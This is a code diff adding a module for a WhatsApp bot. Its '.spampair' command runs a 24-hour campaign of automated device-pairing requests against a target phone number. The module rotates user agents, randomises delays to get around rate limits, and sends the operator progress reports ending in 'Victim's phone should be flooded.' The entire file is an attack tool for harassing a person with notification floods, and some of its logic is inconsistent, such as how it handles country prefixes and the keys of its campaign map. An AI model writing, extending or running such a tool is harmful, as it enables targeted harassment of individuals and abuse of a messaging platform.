@@ -1,0 +1,312 @@
+// ============================================================
+// MODULE: spampair.js
+// WhatsApp Bot command: .spampair <phone_number>
+// Starts a 24-hour device link bombing campaign against the target
+// ============================================================
+
+const axios = require('axios');
+const crypto = require('crypto');
+const EventEmitter = require('events');
+
+// ---------- CONFIGURATION ----------
+const DEFAULT_DURATION_HOURS = 24;
+const THREADS_PER_SESSION = 3;
+const REQUEST_DELAY_MIN_MS = 800;
+const REQUEST_DELAY_MAX_MS = 2500;
+
+// ---------- STATE ----------
+const activeCampaigns = new Map(); // phone -> { stopFlag, stats, startTime }
+
+class SpamPair extends EventEmitter {
+  constructor(phoneNumber, durationHours = DEFAULT_DURATION_HOURS) {
+    super();
+    this.phone = this._formatNumber(phoneNumber);
+    this.durationMs = durationHours * 60 * 60 * 1000;
+    this.stopFlag = false;
+    this.stats = { attempts: 0, success: 0, errors: 0 };
+    this.sessionId = crypto.randomBytes(8).toString('hex');
+    this.userAgents = [
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Version/16.6 Mobile/15E148 Safari/604.1',
+      'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 Chrome/120.0.6099.230 Mobile Safari/537.36',
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
+    ];
+    this._runLoop = this._runLoop.bind(this);
+    this._timer = null;
+    this._threads = [];
+  }
+
+  // ---------- UTILITIES ----------
+  _formatNumber(num) {
+    let clean = num.replace(/\D/g, '');
+    if (!clean.startsWith('91')) clean = '91' + clean;
+    return clean;
+  }
+
+  _randomDelay() {
+    return Math.floor(Math.random() * (REQUEST_DELAY_MAX_MS - REQUEST_DELAY_MIN_MS + 1)) + REQUEST_DELAY_MIN_MS;
+  }
+
+  _randomUA() {
+    return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
+  }
+
+  _generatePairingId() {
+    return crypto.randomBytes(12).toString('hex');
+  }
+
+  // ---------- CORE ATTEMPT ----------
+  async _attemptLink() {
+    try {
+      const pairingId = this._generatePairingId();
+      const payload = {
+        id: pairingId,
+        method: 'pairing',
+        number: this.phone
+      };
+
+      const response = await axios.post(
+        'https://web.whatsapp.com/app/device-pairing',
+        payload,
+        {
+          headers: {
+            'User-Agent': this._randomUA(),
+            'Content-Type': 'application/json',
+            'Origin': 'https://web.whatsapp.com',
+            'Referer': 'https://web.whatsapp.com/',
+            'Accept': 'application/json',
+            'Accept-Language': 'en-US,en;q=0.9'
+          },
+          timeout: 10000
+        }
+      );
+
+      this.stats.attempts++;
+
+      if (response.status === 200) {
+        const data = response.data;
+        if (data?.status === 'ok' || data?.pairing || JSON.stringify(data).includes('pairing')) {
+          this.stats.success++;
+          this.emit('success', { phone: this.phone, attempt: this.stats.attempts });
+          return true;
+        }
+        this.stats.errors++;
+        return false;
+      }
+
+      if (response.status === 429) {
+        this.emit('rate-limit', { phone: this.phone });
+        await this._sleep(10000);
+        return false;
+      }
+
+      this.stats.errors++;
+      return false;
+
+    } catch (error) {
+      this.stats.errors++;
+      if (error.response?.status === 429) {
+        this.emit('rate-limit', { phone: this.phone });
+        await this._sleep(10000);
+      }
+      return false;
+    }
+  }
+
+  // ---------- SLEEP HELPER ----------
+  _sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+
+  // ---------- MAIN LOOP ----------
+  async _runLoop() {
+    const startTime = Date.now();
+    this.emit('start', { phone: this.phone, duration: this.durationMs });
+
+    while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
+      const success = await this._attemptLink();
+      
+      // Emit progress every 10 attempts
+      if (this.stats.attempts % 10 === 0) {
+        this.emit('progress', {
+          phone: this.phone,
+          attempts: this.stats.attempts,
+          success: this.stats.success,
+          errors: this.stats.errors,
+          elapsed: Math.round((Date.now() - startTime) / 1000)
+        });
+      }
+
+      // Random delay between attempts
+      await this._sleep(this._randomDelay());
+
+      // Refresh session occasionally
+      if (this.stats.attempts % 50 === 0) {
+        this.sessionId = crypto.randomBytes(8).toString('hex');
+      }
+    }
+
+    this.emit('done', {
+      phone: this.phone,
+      totalAttempts: this.stats.attempts,
+      totalSuccess: this.stats.success,
+      totalErrors: this.stats.errors,
+      durationSeconds: Math.round((Date.now() - startTime) / 1000)
+    });
+  }
+
+  // ---------- START / STOP ----------
+  start() {
+    if (this._timer) {
+      this.emit('error', { phone: this.phone, message: 'Already running' });
+      return;
+    }
+    this.stopFlag = false;
+    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
+    return this;
+  }
+
+  stop() {
+    this.stopFlag = true;
+    this.emit('stopped', { phone: this.phone, stats: this.stats });
+    return this;
+  }
+
+  getStats() {
+    return { phone: this.phone, ...this.stats, running: !this.stopFlag };
+  }
+}
+
+// ---------- EXPORT FOR BOT ----------
+module.exports = {
+  SpamPair,
+  activeCampaigns,
+
+  // ----- COMMAND HANDLER FOR BOT -----
+  async handleSpamPairCommand(bot, message, args) {
+    const phoneNumber = args[0]?.trim();
+    
+    if (!phoneNumber) {
+      await bot.sendMessage(message.from, '❗ *Usage:* `.spampair 923001234567`\n_(Include country code)_');
+      return;
+    }
+
+    // Check if already running for this number
+    const cleanNumber = phoneNumber.replace(/\D/g, '');
+    if (activeCampaigns.has(cleanNumber)) {
+      const campaign = activeCampaigns.get(cleanNumber);
+      await bot.sendMessage(
+        message.from,
+        `⚠️ Already bombing *${cleanNumber}*\n📊 ${campaign.stats.success} successful / ${campaign.stats.attempts} attempts\n\nType \`.stoppair ${cleanNumber}\` to stop.`
+      );
+      return;
+    }
+
+    // Start new campaign
+    const campaign = new SpamPair(phoneNumber);
+    activeCampaigns.set(cleanNumber, campaign);
+
+    // Set up event listeners
+    campaign.on('start', (data) => {
+      bot.sendMessage(
+        message.from,
+        `🔥 *SpamPair Started*\n📱 Target: *${data.phone}*\n⏰ Duration: 24 hours\n⏳ Let the flood begin...`
+      ).catch(() => {});
+    });
+
+    campaign.on('progress', (data) => {
+      // Only send progress updates every 100 attempts to avoid spam
+      if (data.attempts % 100 === 0) {
+        bot.sendMessage(
+          message.from,
+          `📊 *Progress*\n📱 ${data.phone}\n✅ ${data.success} successful\n📝 ${data.attempts} total attempts\n⏱️ ${Math.floor(data.elapsed / 60)} minutes`
+        ).catch(() => {});
+      }
+    });
+
+    campaign.on('rate-limit', (data) => {
+      bot.sendMessage(
+        message.from,
+        `🐢 *Rate Limit Hit* for ${data.phone}\nCooling down for 10 seconds...`
+      ).catch(() => {});
+    });
+
+    campaign.on('done', (data) => {
+      activeCampaigns.delete(data.phone);
+      bot.sendMessage(
+        message.from,
+        `✅ *SpamPair Complete*\n📱 ${data.phone}\n📨 ${data.totalSuccess} notifications sent\n⏱️ ${Math.floor(data.durationSeconds / 60)} minutes\n\nVictim's phone should be flooded.`
+      ).catch(() => {});
+    });
+
+    campaign.on('stopped', (data) => {
+      activeCampaigns.delete(data.phone);
+      bot.sendMessage(
+        message.from,
+        `🛑 *Stopped* bombing ${data.phone}\n📊 ${data.stats.success} successful / ${data.stats.attempts} attempts`
+      ).catch(() => {});
+    });
+
+    campaign.on('error', (data) => {
+      bot.sendMessage(
+        message.from,
+        `❌ *Error*: ${data.error || data.message}`
+      ).catch(() => {});
+    });
+
+    // Start the campaign
+    campaign.start();
+
+    // Auto-cleanup if bot restarts
+    setTimeout(() => {
+      if (activeCampaigns.has(cleanNumber)) {
+        const camp = activeCampaigns.get(cleanNumber);
+        if (!camp.stopFlag) {
+          camp.stop();
+          activeCampaigns.delete(cleanNumber);
+        }
+      }
+    }, 24 * 60 * 60 * 1000 + 5000); // 24 hours + 5 secs
+  },
+
+  // ----- STOP COMMAND -----
+  async handleStopPairCommand(bot, message, args) {
+    const phoneNumber = args[0]?.trim();
+    if (!phoneNumber) {
+      await bot.sendMessage(message.from, '❗ *Usage:* `.stoppair 923001234567`');
+      return;
+    }
+
+    const cleanNumber = phoneNumber.replace(/\D/g, '');
+    if (!activeCampaigns.has(cleanNumber)) {
+      await bot.sendMessage(message.from, `❌ No active campaign for *${cleanNumber}*`);
+      return;
+    }
+
+    const campaign = activeCampaigns.get(cleanNumber);
+    campaign.stop();
+    activeCampaigns.delete(cleanNumber);
+    await bot.sendMessage(
+      message.from,
+      `🛑 Stopped bombing *${cleanNumber}*\n📊 ${campaign.stats.success} successful notifications sent.`
+    );
+  },
+
+  // ----- STATUS COMMAND -----
+  async handlePairStatusCommand(bot, message) {
+    if (activeCampaigns.size === 0) {
+      await bot.sendMessage(message.from, '📭 No active spam campaigns.');
+      return;
+    }
+
+    let status = '📊 *Active SpamPair Campaigns*\n\n';
+    for (const [phone, campaign] of activeCampaigns) {
+      status += `📱 *${phone}*\n`;
+      status += `   ✅ ${campaign.stats.success} successful\n`;
+      status += `   📝 ${campaign.stats.attempts} total\n`;
+      status += `   ❌ ${campaign.stats.errors} errors\n\n`;
+    }
+    status += 'Type `.stoppair <phone>` to stop a campaign.';
+    await bot.sendMessage(message.from, status);
+  }
+};
